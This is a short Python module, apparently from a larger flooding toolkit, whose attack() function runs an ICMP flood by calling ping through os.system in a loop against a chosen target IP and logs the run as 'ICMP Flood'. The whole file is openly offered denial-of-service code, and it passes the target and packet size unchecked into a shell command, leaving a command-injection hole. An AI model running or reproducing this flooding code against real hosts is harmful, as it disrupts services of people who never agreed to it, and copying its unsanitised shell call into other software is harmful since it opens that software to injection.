import os
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=64, headers=None, spoof_ip=None):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            os.system(f"ping -c 1 -s {packet_size} {target_ip}")
    log_attack("ICMP Flood", target_ip, target_port, duration, intensity)

